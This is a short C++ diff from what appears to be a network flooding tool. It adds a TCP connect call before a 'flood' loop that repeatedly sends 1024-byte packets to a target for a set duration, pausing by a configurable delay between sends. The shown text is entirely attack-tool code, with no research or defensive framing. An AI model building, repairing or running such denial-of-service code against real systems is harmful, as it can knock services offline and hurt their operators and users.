@@ -29,6 +29,8 @@ void flood(Data data)
 
 		time_point<system_clock> end = system_clock::now() + milliseconds(data.time);
 
+		tcp.Connect();
+
 		while (system_clock::now() < end) {
 			tcp.Send(const_cast<char*>(data.packet), 1024);
 			std::this_thread::sleep_for(milliseconds(data.delay));
